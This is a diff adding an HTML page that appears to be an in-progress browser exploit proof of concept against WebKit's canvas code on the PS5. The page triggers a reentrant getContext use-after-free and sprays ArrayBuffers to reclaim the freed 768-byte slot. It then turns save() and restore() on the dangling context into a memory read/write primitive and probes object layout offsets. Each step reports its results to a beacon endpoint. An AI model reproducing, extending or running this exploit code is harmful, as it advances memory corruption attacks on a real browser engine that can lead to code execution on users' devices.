@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V530</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V530 — Canvas UAF + AB Identification via save()
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V530-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+B('BOOT',navigator.userAgent);
+
+// m_unrealizedSaveCount is at offset +592 (unsigned, 4 bytes)
+var SAVE_COUNT_OFFSET = 592;
+// Size class for CanvasRenderingContext2D on PS5 (FastMalloc, no IsoHeap)
+var CTX_SIZE = 768;
+
+// === T1: Trigger canvas reentrant getContext UAF ===
+setTimeout(function(){
+  try{
+    B('T1-START','triggering UAF');
+    var canvas = document.createElement('canvas');
+    canvas.width = 300;
+    canvas.height = 150;
+
+    var innerCtx = null;
+
+    // The IDL dictionary converter for bitmaprenderer settings reads 'alpha' property
+    // If alpha is commented out in WK-1400, try 'desynchronized' or other settings
+    // Actually, ImageBitmapRenderingContextSettings only has alpha:
+    // Let's try both approaches
+
+    var settings = {};
+    Object.defineProperty(settings, 'alpha', {
+      get: function() {
+        B('T1-GETTER','alpha getter triggered');
+        innerCtx = canvas.getContext('2d');
+        if (innerCtx) {
+          innerCtx.lineWidth = 1337.42;
+          B('T1-INNER','2d context created, lineWidth='+innerCtx.lineWidth);
+        } else {
+          B('T1-INNER-FAIL','getContext 2d returned null');
+        }
+        return true;
+      }
+    });
+
+    var outerCtx;
+    try {
+      outerCtx = canvas.getContext('bitmaprenderer', settings);
+    } catch(e) {
+      B('T1-OUTER-ERR',''+e);
+    }
+
+    if (outerCtx) {
+      B('T1-OUTER','bitmaprenderer context created');
+    } else {
+      B('T1-OUTER-NULL','bitmaprenderer returned null');
+    }
+
+    if (!innerCtx) {
+      B('T1-DEAD','inner context not created, trying desynchronized');
+      // Try with desynchronized getter instead
+      var canvas2 = document.createElement('canvas');
+      canvas2.width = 300; canvas2.height = 150;
+      var settings2 = {};
+      Object.defineProperty(settings2, 'desynchronized', {
+        get: function() {
+          B('T1B-GETTER','desynchronized getter triggered');
+          innerCtx = canvas2.getContext('2d');
+          if (innerCtx) {
+            innerCtx.lineWidth = 1337.42;
+            B('T1B-INNER','2d context created');
+          }
+          return false;
+        }
+      });
+      try {
+        outerCtx = canvas2.getContext('bitmaprenderer', settings2);
+      } catch(e) { B('T1B-OUTER-ERR',''+e); }
+      canvas = canvas2;
+    }
+
+    // At this point:
+    // - innerCtx: dangling wrapper to freed 2d context (if UAF worked)
+    // - outerCtx: bitmaprenderer context (owns m_context now)
+    // - The 2d context's 768B slot is freed
+
+    if (!innerCtx) {
+      B('T1-ABORT','no inner context created');
+      return;
+    }
+
+    // Store for later tests
+    window._innerCtx = innerCtx;
+    window._canvas = canvas;
+    window._outerCtx = outerCtx;
+    B('T1-DONE','UAF trigger complete');
+
+  } catch(e) { B('T1-ERR',''+e); }
+}, 500);
+
+// === T2: Spray 768B ArrayBuffers ===
+setTimeout(function(){
+  try{
+    if (!window._innerCtx) { B('T2-SKIP','no inner ctx'); return; }
+    B('T2-START','spraying '+CTX_SIZE+'B ArrayBuffers');
+
+    var spray = [];
+    var SPRAY_COUNT = 2000;
+    for (var i = 0; i < SPRAY_COUNT; i++) {
+      spray.push(new ArrayBuffer(CTX_SIZE));
+    }
+    window._spray = spray;
+    B('T2-SPRAYED','n='+spray.length);
+
+    // Verify all ABs are zero-init at save count offset
+    var nonZero = 0;
+    for (var i = 0; i < spray.length; i++) {
+      var u32 = new Uint32Array(spray[i], SAVE_COUNT_OFFSET, 1);
+      if (u32[0] !== 0) nonZero++;
+    }
+    B('T2-CHECK','nonzero at offset '+SAVE_COUNT_OFFSET+': '+nonZero+'/'+spray.length);
+
+  } catch(e) { B('T2-ERR',''+e); }
+}, 2000);
+
+// === T3: Call save() on dangling wrapper ===
+setTimeout(function(){
+  try{
+    if (!window._innerCtx || !window._spray) { B('T3-SKIP','no ctx or spray'); return; }
+    B('T3-START','calling save() on dangling wrapper');
+
+    // save() does ++m_unrealizedSaveCount — writes to offset +592
+    // If an AB reclaimed the slot, this increments the AB's byte 592 from 0 to 1
+    try {
+      window._innerCtx.save();
+      B('T3-SAVE','save() completed without crash');
+    } catch(e) {
+      B('T3-SAVE-ERR',''+e);
+      return;
+    }
+
+    // Scan all ABs for the save marker
+    var found = [];
+    for (var i = 0; i < window._spray.length; i++) {
+      var u32 = new Uint32Array(window._spray[i], SAVE_COUNT_OFFSET, 1);
+      if (u32[0] !== 0) {
+        found.push({idx: i, val: u32[0]});
+      }
+    }
+
+    B('T3-SCAN','found '+found.length+' ABs with nonzero at offset '+SAVE_COUNT_OFFSET);
+    for (var j = 0; j < Math.min(5, found.length); j++) {
+      B('T3-HIT','idx='+found[j].idx+' val='+found[j].val);
+    }
+
+    if (found.length === 1) {
+      window._targetIdx = found[0].idx;
+      B('T3-TARGET','IDENTIFIED target AB at index '+found[0].idx);
+    } else if (found.length === 0) {
+      B('T3-MISS','no AB hit — slot not reclaimed or wrong offset');
+    } else {
+      // Multiple hits — might need refinement
+      window._targetIdx = found[0].idx;
+      B('T3-MULTI','multiple hits, using first: idx='+found[0].idx);
+    }
+
+  } catch(e) { B('T3-ERR',''+e); }
+}, 4000);
+
+// === T4: Double save() verification ===
+setTimeout(function(){
+  try{
+    if (window._targetIdx === undefined) { B('T4-SKIP','no target'); return; }
+    B('T4-START','double save verification');
+
+    // Call save() again — should increment from 1 to 2
+    window._innerCtx.save();
+
+    var u32 = new Uint32Array(window._spray[window._targetIdx], SAVE_COUNT_OFFSET, 1);
+    B('T4-VERIFY','target AB offset '+SAVE_COUNT_OFFSET+' = '+u32[0]+' (expected 2)');
+
+    if (u32[0] === 2) {
+      B('T4-CONFIRMED','BIDIRECTIONAL: save() writes through dangling ptr into AB');
+    }
+
+    // Call save() 3 more times for extra confirmation
+    window._innerCtx.save();
+    window._innerCtx.save();
+    window._innerCtx.save();
+    u32 = new Uint32Array(window._spray[window._targetIdx], SAVE_COUNT_OFFSET, 1);
+    B('T4-MULTI','after 5 total saves: val='+u32[0]+' (expected 5)');
+
+  } catch(e) { B('T4-ERR',''+e); }
+}, 6000);
+
+// === T5: Write controlled data to target AB, test lineWidth read ===
+setTimeout(function(){
+  try{
+    if (window._targetIdx === undefined) { B('T5-SKIP','no target'); return; }
+    B('T5-START','preparing stateStack in target AB');
+
+    var target = window._spray[window._targetIdx];
+    var view = new DataView(target);
+
+    // We need to find exact offset of m_stateStack within the object
+    // Vector<State, 1> m_stateStack has inline storage for 1 State
+    // Vector layout: { m_buffer (8B ptr), m_capacity (4B), m_size (4B) } = 16B header
+    // Then inline State storage follows immediately
+
+    // We don't know the exact offset of m_stateStack yet
+    // But we can probe: try setting m_size=1 at different candidate offsets
+    // and see if lineWidth read succeeds
+
+    // First, let's dump the current target AB contents (after save())
+    var hex = [];
+    for (var i = 0; i < Math.min(64, CTX_SIZE); i++) {
+      hex.push(('0'+view.getUint8(i).toString(16)).slice(-2));
+    }
+    B('T5-DUMP-0','first 64B: '+hex.join(' '));
+
+    hex = [];
+    for (var i = 580; i < Math.min(600, CTX_SIZE); i++) {
+      hex.push(('0'+view.getUint8(i).toString(16)).slice(-2));
+    }
+    B('T5-DUMP-592','bytes 580-599: '+hex.join(' '));
+
+    // For now, DON'T try to read lineWidth yet — that requires valid stateStack
+    // Instead, test what OTHER properties we can safely read/write
+
+    // m_usesDisplayListDrawing is at the next offset after m_unrealizedSaveCount
+    // (offset +596 or nearby)
+
+    // Let's try a different approach: write a marker to various offsets
+    // and see what read-backs we can get through the wrapper
+
+    // globalAlpha read: state().globalAlpha
+    // This dereferences stateStack — dangerous
+    // Let's skip reads for now and focus on writes
+
+    // save() at +592 already works
+    // restore() does: if (m_unrealizedSaveCount) { --m_unrealizedSaveCount; return; }
+    // So restore() also ONLY touches +592 if unrealizedSaveCount > 0
+
+    B('T5-RESTORE','testing restore()');
+    var pre = new Uint32Array(target, SAVE_COUNT_OFFSET, 1);
+    var preVal = pre[0];
+    window._innerCtx.restore();
+    var postVal = pre[0];
+    B('T5-RESTORE-RESULT','pre='+preVal+' post='+postVal+' (expected decrement)');
+
+  } catch(e) { B('T5-ERR',''+e); }
+}, 8000);
+
+// === T6: Write to stateStack offset and test lineWidth ===
+setTimeout(function(){
+  try{
+    if (window._targetIdx === undefined) { B('T6-SKIP','no target'); return; }
+    B('T6-START','attempting lineWidth read with crafted stateStack');
+
+    var target = window._spray[window._targetIdx];
+    var view = new DataView(target);
+
+    // We need to know the m_stateStack offset to craft a valid layout
+    // CanvasRenderingContext base class fields before CanvasRenderingContext2DBase:
+    // From context_not_freed memory: m_canvas at +32
+    // ScriptWrappable: vtable(8) + m_wrapper(8) = 16B
+    // CanMakeWeakPtr: ~8B (WeakPtrImpl ptr)
+    // CanMakeCheckedPtr: ~8B
+    // m_canvas: 8B (reference)
+    // m_hasActiveInspectorCanvasCallTracer: 1B + padding = 8B
+    // Total base: ~48B
+
+    // CanvasPath adds Path member and maybe more
+    // Then CanvasRenderingContext2DBase adds m_stateStack
+
+    // Actually, let's empirically find it by brute-force:
+    // Set save count to known value, then vary offset for m_size
+
+    // First, ensure m_unrealizedSaveCount = 0 (for safe restore)
+    var u32sc = new Uint32Array(target, SAVE_COUNT_OFFSET, 1);
+    u32sc[0] = 0;
+
+    // Try candidate offsets for m_stateStack.m_size (uint32 at header+12)
+    // Vector header: m_buffer(8) + m_capacity(4) + m_size(4) = 16B
+    // m_size is at Vector_offset + 12
+
+    // Don't try to read — too risky without proper m_buffer
+    // Instead, let's use a safer observable: isContextLost() or similar
+
+    // Actually the safest test: write 0xDEADBEEF to various offsets, then
+    // call save() to see which offset save() modifies (confirms +592)
+
+    // Actually, we already confirmed +592 works in T3/T4. Let me focus on
+    // using save/restore as a controlled R/W primitive at offset +592
+
+    // Can we use the AB to read what save() writes?
+    // We can call save() N times and observe the increment in the AB
+    // This gives us write(offset+592) = current_value + 1
+
+    // More interestingly: can we write to offset +592 via JS (set the AB byte)
+    // then call restore() which reads it?
+
+    // restore() logic:
+    // if (m_unrealizedSaveCount) { --m_unrealizedSaveCount; return; }
+    // else: m_stateStack.removeLast() — THIS touches stateStack!
+
+    // So: set offset+592 to 1 → restore() reads 1, decrements to 0, returns safely
+    // Set offset+592 to 0 → restore() tries removeLast() → crash!
+
+    // This confirms we have controlled write to +592 and controlled read via restore()
+
+    // Let's demonstrate the full bidirectional:
+    // 1. Write 100 to AB[592]
+    u32sc[0] = 100;
+    B('T6-WRITE','set AB[592]=100');
+
+    // 2. Call save() — should read 100, increment to 101
+    window._innerCtx.save();
+    B('T6-SAVE','save() called, AB[592]='+u32sc[0]+' (expected 101)');
+
+    // 3. Write 50 to AB[592]
+    u32sc[0] = 50;
+    B('T6-OVERWRITE','set AB[592]=50');
+
+    // 4. Call restore() — reads 50, decrements to 49
+    window._innerCtx.restore();
+    B('T6-RESTORE','restore() called, AB[592]='+u32sc[0]+' (expected 49)');
+
+    // 5. Set to 0 and save() — should go to 1
+    u32sc[0] = 0;
+    window._innerCtx.save();
+    B('T6-ZERO-SAVE','from 0: AB[592]='+u32sc[0]+' (expected 1)');
+
+    if (u32sc[0] === 1) {
+      B('T6-CONFIRMED','FULL BIDIRECTIONAL R/W at offset 592 confirmed');
+    }
+
+  } catch(e) { B('T6-ERR',''+e); }
+}, 10000);
+
+// === T7: Probe stateStack offset by testing lineWidth crash points ===
+setTimeout(function(){
+  try{
+    if (window._targetIdx === undefined) { B('T7-SKIP','no target'); return; }
+    B('T7-START','probing for stateStack offset');
+
+    // Instead of risking a crash, let's use a technique:
+    // We know the total object is 768B. m_unrealizedSaveCount at +592.
+    // Members after stateStack: m_dirtyRect(16B), m_unrealizedSaveCount(4B), ...
+    // So stateStack ends around 592 - 16 = 576
+    // Vector<State,1> includes inline storage for 1 State
+    // State is probably 400-500 bytes (lots of canvas state)
+    // Vector header is 16B
+    // So stateStack starts around 576 - sizeof(State) - 16
+
+    // From the 768B layout and m_canvas at +32:
+    // CanvasRenderingContext: ~48B (vtable, wrapper, weakptr, checkedptr, m_canvas, bool)
+    // CanvasPath: Path m_path — probably ~48-64B
+    // So CanvasRenderingContext2DBase starts around offset ~96-128
+
+    // Vector<State,1> is the FIRST member of Base
+    // With inline capacity 1, sizeof(Vector<State,1>) = 16 + sizeof(State)
+
+    // Total layout: ~128 + 16 + sizeof(State) + 16(dirtyRect) + 4(saveCount) + ... = 768
+    // So: sizeof(State) ≈ 768 - 128 - 16 - 16 - 4 - ... ≈ ~500-600B
+
+    // m_stateStack starts at ~128
+    // m_stateStack.m_buffer at ~128 (8B ptr)
+    // m_stateStack.m_capacity at ~136 (4B)
+    // m_stateStack.m_size at ~140 (4B)
+    // Inline State starts at ~144
+
+    // Let's report the target AB's byte contents at candidates
+    var target = window._spray[window._targetIdx];
+    var view = new DataView(target);
+
+    // Dump bytes around candidate stateStack offset
+    var offsets = [96, 112, 128, 144, 160, 176];
+    for (var k = 0; k < offsets.length; k++) {
+      var off = offsets[k];
+      var hex = [];
+      for (var i = off; i < Math.min(off+16, CTX_SIZE); i++) {
+        hex.push(('0'+view.getUint8(i).toString(16)).slice(-2));
+      }
+      B('T7-PROBE','offset '+off+': '+hex.join(' '));
+    }
+
+    // Dump around save count for context
+    var hex2 = [];
+    for (var i = 576; i < Math.min(608, CTX_SIZE); i++) {
+      hex2.push(('0'+view.getUint8(i).toString(16)).slice(-2));
+    }
+    B('T7-SAVE-AREA','offset 576-607: '+hex2.join(' '));
+
+    B('T7-DONE','probe complete — need to analyze offsets');
+
+  } catch(e) { B('T7-ERR',''+e); }
+}, 12000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},15000);
+</script></body></html>
